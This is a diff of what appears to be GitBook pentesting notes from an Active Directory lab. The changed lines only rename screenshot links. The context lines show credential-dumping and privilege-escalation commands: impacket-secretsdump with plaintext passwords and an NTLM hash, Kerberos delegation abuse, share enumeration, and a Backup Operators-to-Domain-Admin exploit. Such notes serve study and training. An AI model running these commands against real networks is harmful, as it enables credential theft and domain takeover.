@@ -57,10 +57,10 @@ nslookup appsrv01
     * OR Krbrelayx attack on unconstrained delegation
       *
 
-          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             # Dump as domain user
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
@@ -153,7 +153,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -177,7 +177,7 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -196,7 +196,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -333,7 +333,7 @@ nslookup appsrv01
       ```
 
 
-- **Check if commands are restricted:** ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
+- **Check if commands are restricted:** ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)
   *   <pre class="language-powershell"><code class="lang-powershell">[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
       # NoLanguageMode --> likely restricted by JEA.
 
@@ -391,14 +391,14 @@ nslookup appsrv01
     Get-Command -Module Microsoft.ActiveDirectory.Management | Where-Object { $_.Name -like "Get-*" }
     ```
 
-    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 *   ```powershell
     Get-ADOptionalFeature -Filter *
     ```
 
-    <figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 *   ```powershell
     Get-NetUser mary | select memberof
     Get-NetGroup j_approve | select member
@@ -413,7 +413,7 @@ nslookup appsrv01
     Get-NetGPO l_web01
     ```
 
-    <figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Copy paste path to explorer
@@ -437,7 +437,7 @@ nslookup appsrv01
 
 <summary>Exploiting Backup Operators To Domain Admin</summary>
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 First, Enumerate writable shares:
 
@@ -445,7 +445,7 @@ First, Enumerate writable shares:
 nxc smb 192.168.210.0/24 -u melissa -p WinterIsHere2022! --shares
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Exploit using [https://github.com/mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)
 
@@ -473,7 +473,7 @@ Secretsdump --> get machine account hash
 impacket-secretsdump LOCAL -system SYSTEM -security SECURITY -sam SAM
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using machine acc hash, use secretsdump to dump creds on the DC --> get Domain Admin hash
 
@@ -481,7 +481,7 @@ Using machine acc hash, use secretsdump to dump creds on the DC --> get Domain A
 impacket-secretsdump internal.zsm.local/'ZPH-SVRCDC01$'@ZPH-SVRCDC01.internal.zsm.local -hashes :d47a6d90e1c5adf4200227514e393948
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
